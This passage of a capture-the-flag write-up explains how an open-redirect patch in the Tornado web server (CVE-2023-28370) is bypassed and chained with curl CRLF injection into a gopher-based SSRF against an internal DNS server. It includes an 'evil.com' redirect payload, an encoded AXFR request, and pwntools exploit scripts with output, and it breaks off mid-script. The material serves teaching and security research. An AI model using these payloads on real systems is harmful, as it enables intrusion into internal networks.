+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">5000</span>)
+</span></span><span style="display:flex;"><span>    tornado<span style="color:#f92672">.</span>ioloop<span style="color:#f92672">.</span>IOLoop<span style="color:#f92672">.</span>current()<span style="color:#f92672">.</span>start()
+</span></span></code></pre></div><p>The first striking thing is the 4th line: an internal element of the server is modified.<br>
+It&rsquo;s likely to play a part in the vulnerability we&rsquo;re looking for.</p>
+<p>It seems that the application defines a <code>tornado.web.StaticFileHandler</code> to the <code>public</code> folder with the default file: <code>index.html</code>.</p>
+<p>If we refer to the official documentation on <a href="https://www.tornadoweb.org/en/stable/web.html#tornado.web.StaticFileHandler" target="_blank">tornado.web.StaticFileHandler</a> we find the following code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>application <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>Application([
+</span></span><span style="display:flex;"><span>    (<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;/content/(.*)&#34;</span>, web<span style="color:#f92672">.</span>StaticFileHandler, {<span style="color:#e6db74">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;/var/www&#34;</span>}),
+</span></span><span style="display:flex;"><span>])
+</span></span></code></pre></div><p>There&rsquo;s a difference here with regexes!
+The one we have is more lax, allowing HTTP requests to start with <code>GET </code> and not <code>GET /</code>.<br>
+This is a liberty worth noting for the future.</p>
+<p>I started by looking for <code>tornado.web._unicode</code> since that&rsquo;s what the service modifies.<br>
+See the original code: <a href="https://github.com/tornadoweb/tornado/blob/master/tornado/escape.py#L245-L260" target="_blank">here</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">to_unicode</span>(value: Union[<span style="color:#66d9ef">None</span>, str, bytes]) <span style="color:#f92672">-&gt;</span> Optional[str]:
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Converts a string argument to a unicode string.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    If the argument is already a unicode string or None, it is returned
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    unchanged.  Otherwise it must be a byte string and is decoded as utf8.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isinstance(value, _TO_UNICODE_TYPES):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> value
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> isinstance(value, bytes):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">TypeError</span>(<span style="color:#e6db74">&#34;Expected bytes, unicode, or None; got </span><span style="color:#e6db74">%r</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> type(value))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> value<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># to_unicode was previously named _unicode not because it was private,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># but to avoid conflicts with the built-in unicode() function/type</span>
+</span></span><span style="display:flex;"><span>_unicode <span style="color:#f92672">=</span> to_unicode
+</span></span></code></pre></div><p>This function simply takes bytes as parameters and decodes them. If an exception on the UTF-8 decoding of the parameter is raised, then the request crashes.</p>
+<p>We can compare the patch:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Avant: value<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>Aprés: value<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>, <span style="color:#e6db74">&#34;replace&#34;</span>)
+</span></span></code></pre></div><p>The addition of <code>replace</code> specifies that if the decoded character is not in the UTF-8 encoding, then it will be retained as is in the return.</p>
+<p><em>Exemple:</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> a <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> a<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>Traceback (most recent call last):
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;&lt;stdin&gt;&#34;</span>, line <span style="color:#ae81ff">1</span>, <span style="color:#f92672">in</span> <span style="color:#f92672">&lt;</span>module<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">UnicodeDecodeError</span>: <span style="color:#e6db74">&#39;utf-8&#39;</span> codec can<span style="color:#e6db74">&#39;t decode byte 0xff in position 0: invalid start byte</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> a<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>, <span style="color:#e6db74">&#34;replace&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;�&#39;</span>
+</span></span></code></pre></div><p>This is good news for us, as we&rsquo;re planning to send a TCP frame in a url on the server (Openredirect).</p>
+<p>We can now concentrate on Tornado management for <em>StaticFileHandler</em>.
+Searching for potential redirections, we come across <a href="https://github.com/tornadoweb/tornado/blob/master/tornado/web.py#L2846-L2903" target="_blank">this code</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">validate_absolute_path</span>(self, root: str, absolute_path: str) <span style="color:#f92672">-&gt;</span> Optional[str]
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">....</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;/&#34;</span>):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;//&#34;</span>):
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e"># A redirect with two initial slashes is a &#34;protocol-relative&#34; URL.</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e"># This means the next path segment is treated as a hostname instead</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e"># of a part of the path, making this effectively an open redirect.</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e"># Reject paths starting with two slashes to prevent this.</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e"># This is only reachable under certain configurations.</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">raise</span> HTTPError(
+</span></span><span style="display:flex;"><span>                        <span style="color:#ae81ff">403</span>, <span style="color:#e6db74">&#34;cannot redirect path with two initial slashes&#34;</span>
+</span></span><span style="display:flex;"><span>                    )
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>redirect(self<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>path <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span>, permanent<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">....</span>
+</span></span></code></pre></div><p>This function is called when the path of a <em>StaticFileHandler</em> is reached.<br>
+The server will check that the path provided corresponds to a folder defined as static by the <code>web.Application</code> configuration.<br>
+If the path provided corresponds to a static folder and does not end with a <code>/</code>, it will perform a redirection by adding a <strong>/</strong>.</p>
+<p><em>Exemple</em>:</p>
+<pre tabindex="0"><code>$ curl localhost:5000/js -v
+* Host localhost:5000 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:5000...
+* Connected to localhost (::1) port 5000
+&gt; GET /js HTTP/1.1
+&gt; Host: localhost:5000
+&gt; User-Agent: curl/8.5.0
+&gt; Accept: */*
+&gt;
+&lt; HTTP/1.1 301 Moved Permanently
+&lt; Server: TornadoServer/6.4
+&lt; Content-Type: text/html; charset=UTF-8
+&lt; Date: Fri, 12 Apr 2024 13:45:38 GMT
+&lt; Location: /js/
+&lt; Content-Length: 0
+&lt;
+* Connection #0 to host localhost left intact
+</code></pre><p>An interesting comment is included in the code:</p>
+<pre tabindex="0"><code>A redirect with two initial slashes is a &#34;protocol-relative&#34; URL.
+This means the next path segment is treated as a hostname instead
+of a part of the path, making this effectively an open redirect.
+Reject paths starting with two slashes to prevent this.
+This is only reachable under certain configurations.
+</code></pre><p>It seems that an older version of the application is <a href="https://github.com/tornadoweb/tornado/commit/89aacf12f351dfde76fb8d3ac361dd489087d072" target="_blank">vulnerable to an Open-Redirect</a>!
+Let&rsquo;s find out more !</p>
+<p>In the github commit/issues, you&rsquo;ll find an update from May 2023 fixing the <code>CVE-2023-28370</code> (Open Redirect):</p>
+<ul>
+<li><a href="https://github.com/tornadoweb/tornado/releases/tag/v6.3.2" target="_blank">https://github.com/tornadoweb/tornado/releases/tag/v6.3.2</a></li>
+<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-TORNADO-5537286" target="_blank">https://security.snyk.io/vuln/SNYK-PYTHON-TORNADO-5537286</a></li>
+</ul>
+<p>Finally, there&rsquo;s a patch test script:</p>
+<ul>
+<li><a href="https://github.com/tornadoweb/tornado/commit/6e3521da44c349197cf8048c8a6c69d3f4ccd971" target="_blank">https://github.com/tornadoweb/tornado/commit/6e3521da44c349197cf8048c8a6c69d3f4ccd971</a></li>
+<li><a href="https://github.com/tornadoweb/tornado/pull/3276#issuecomment-1685080310" target="_blank">https://github.com/tornadoweb/tornado/pull/3276#issuecomment-1685080310</a></li>
+</ul>
+<p>Here&rsquo;s the payload tested:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>GET <span style="color:#f92672">//</span>evil<span style="color:#f92672">.</span>com<span style="color:#f92672">/../</span>usr<span style="color:#f92672">/</span>app<span style="color:#f92672">/</span>static<span style="color:#f92672">/</span>js
+</span></span></code></pre></div><p>The <code>os.path.join</code> function returns <code>/usr/app/static/js</code> when <code>os.path.dirname(__file__)</code> and <code>//evil.com/../usr/app/static/js</code> are passed as parameters.</p>
+<p>However, the link <code>//evil.com</code> is interpreted as an HTTP url by the browser and therefore redirects the user to an external site.</p>
+<p>To prevent this vulnerability, the developers have added a check at the beginning of the redirection url:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;//&#34;</span>): 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> HTTPError(
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">403</span>, <span style="color:#e6db74">&#34;cannot redirect path with two initial slashes&#34;</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span></code></pre></div><h4 id="bypassing-the-patch">Bypassing the patch.</h4>
+<p>By adding a protocol to the url, it will still be vulnerable but will not start with <code>//</code>.<br>
+What&rsquo;s more, you&rsquo;ll need to adjust the number of <code>../</code> to get back to the root.</p>
+<p>Adding a protocol to the url is possible thanks to the reggex weakness described above.</p>
+<p>So we can send this kind of request:</p>
+<pre tabindex="0"><code>GET gopher://&lt;dns&gt;:53/_&lt;axfr&gt;#/../../../../usr/app/static/js
+...
+</code></pre><p>The application will retrieve the following path:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">import</span> os.path
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;gopher://&lt;dns&gt;:53/_&lt;axfr&gt;/../../../../usr/app/static/js&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;/usr/app/static/js&#39;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;/usr/app/static/js&#39;</span>
+</span></span></code></pre></div><p>The file&rsquo;s existence will be verified and then the redirection will take place.</p>
+<p>There&rsquo;s one last flaw: the end of the url <em>(/../../../../usr/app/static/js)</em> must be ingested by gopher but not by tornado.</p>
+<p>After testing 255 characters, only 3 were interesting!</p>
+<ul>
+<li>\x00</li>
+<li>?</li>
+<li>#</li>
+</ul>
+<p>The <code>\x00</code> is an unappreciated character in curl, often causing errors when passed in a parameter.<br>
+The <code>?</code> allows curl to perform the request on <code>gopher://&lt;dns&gt;:53/_&lt;axfr&gt;</code> but the python server doesn&rsquo;t perform the redirection because it interprets the rest of the <em>?</em> as a GET parameter.</p>
+<p>So the <code>#</code> looks like a good candidate!</p>
+<p>You can test the application deployed locally:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>axfr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%004n%DB</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">20</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">01</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">01</span><span style="color:#e6db74">%08f</span><span style="color:#e6db74">csc2024</span><span style="color:#e6db74">%02f</span><span style="color:#e6db74">r</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%F</span><span style="color:#e6db74">C</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">01</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">04%D0</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">0C</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">0A</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">08I%B8</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">3C05P%8A&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">5000</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET gopher://pong-internal-dns:53/_</span><span style="color:#e6db74">{</span>axfr<span style="color:#e6db74">}</span><span style="color:#e6db74">#/../../../../public/js HTTP/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: localhost:5000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Accept: */*
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>print(str(io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>))[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))	
+</span></span></code></pre></div><p><em>Output</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">301</span> Moved Permanently<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>Server: TornadoServer/6.4<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>Date: Fri, <span style="color:#ae81ff">12</span> Apr <span style="color:#ae81ff">2024</span> 13:48:10 GMT<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>Location: gopher://pong-internal-dns:53/_%004n%DB%00%20%00%01%00%00%00%00%00%01%08fcsc2024%02fr%00%00%FC%00%01%00%00%29%04%D0%00%00%00%00%00%0C%00%0A%00%08I%B8%29%3C05P%8A#/../../../../public/js/<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>Content-Length: 0<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>Connection: close<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\r</span>
+</span></span></code></pre></div><h3 id="last-step">Last step</h3>
+<p>Now that we have the last element of our Kill-Chain, we need to find a way to send the following request to the python backend via curl :</p>
+<pre tabindex="0"><code>GET gopher://pong-internal-dns:53/_&lt; ..axfr ..&gt;#/../../../../public/js HTTP/1.1
+Host: localhost:5000
+Accept: */*
+Connection: close
+</code></pre><p>However, by default, curl has a <code>/</code> as its default query path.
+So the following query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ch <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>();
+</span></span><span style="display:flex;"><span>$options <span style="color:#f92672">=</span> [<span style="color:#a6e22e">CURLOPT_URL</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;http://127.0.0.1:5000&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl_setopt_array</span>($ch, $options);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl_exec</span>($ch);
+</span></span></code></pre></div><p>will perform a query of the form:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GET / HTTP/1.1<span style="color:#ae81ff">\r</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>This is a problem here, as we want our sent path to start with <code>gopher://...</code>.</p>
+<p>To solve this last problem, we&rsquo;ll use the CUrl <strong>CURLOPT_CUSTOMREQUEST</strong> option.</p>
+<p>According to the documentation, this parameter is used to redefine the method used during the http request:</p>
+<ul>
+<li><em>get</em>,<em>post</em>,<em>put</em>,<em>option</em>,<em>path</em> &hellip;</li>
+</ul>
+<p>Making the link with <em>CRLF</em> injections presented earlier, we can define the method as:</p>
+<pre tabindex="0"><code>GET gopher://&lt;..payload..&gt; HTTP/1.1\r\nX-foo:
+</code></pre><p>In this way, curl will perform the following query:</p>
+<pre tabindex="0"><code>GET gopher://&lt;..payload..&gt; HTTP/1.1\r
+X-foo: / HTTP/1.1\r
+...
+</code></pre><p>By passing a header name and line feed, anything following the legitimate request method will be interpreted as a header value and form a valid request.</p>
+<h2 id="pooling">Pooling:</h2>
+<p>We can now complete the exploitation!
+Here&rsquo;s the script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote_plus <span style="color:#66d9ef">as</span> urlenc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;critical&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>redos <span style="color:#f92672">=</span> urlenc(<span style="color:#e6db74">&#39;?a=&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;voz.ec&#39;</span> <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">30</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">nice_print</span>(data):
+</span></span><span style="display:flex;"><span>	print(str(data<span style="color:#f92672">.</span>strip())<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ssrf</span>(where, options):
+</span></span><span style="display:flex;"><span>	io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">8000</span>, ssl<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/?game=localhost</span><span style="color:#e6db74">{</span>redos<span style="color:#e6db74">}</span><span style="color:#e6db74">%26game%3d</span><span style="color:#e6db74">{</span>where<span style="color:#e6db74">}{</span>options<span style="color:#e6db74">}</span><span style="color:#e6db74">%26b%3D
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET </span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74"> HTTP/1.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: localhost:8000</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: close</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Upgrade-Insecure-Requests: 1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	result <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">30</span>)
+</span></span><span style="display:flex;"><span>	nice_print(result)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>axfr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%004n%DB</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">20</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">01</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">01</span><span style="color:#e6db74">%08f</span><span style="color:#e6db74">csc2024</span><span style="color:#e6db74">%02f</span><span style="color:#e6db74">r</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%F</span><span style="color:#e6db74">C</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">01</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">04%D0</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">00</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">0C</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">0A</span><span style="color:#e6db74">%00%</span><span style="color:#e6db74">08I%B8</span><span style="color:#e6db74">%29%</span><span style="color:#e6db74">3C05P%8A&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">gopher://pong-internal-dns:53/_</span><span style="color:#e6db74">{</span>axfr<span style="color:#e6db74">}</span><span style="color:#e6db74">#/../../../../public/js
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mapping <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;CURLOPT_FOLLOWLOCATION&#39;</span>: <span style="color:#e6db74">&#39;52&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;CURLOPT_CUSTOMREQUEST&#39;</span>: <span style="color:#e6db74">&#39;10036&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;CURLOPT_REDIR_PROTOCOLS&#39;</span>: <span style="color:#e6db74">&#39;182&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;CURLPROTO_GOPHER&#39;</span>: <span style="color:#e6db74">&#39;33554432&#39;</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>options <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&amp;&#39;</span><span style="color:#f92672">.</span>join([
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;options[CURLOPT_FOLLOWLOCATION]=1&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;options[CURLOPT_REDIR_PROTOCOLS]=CURLPROTO_GOPHER&#39;</span>,
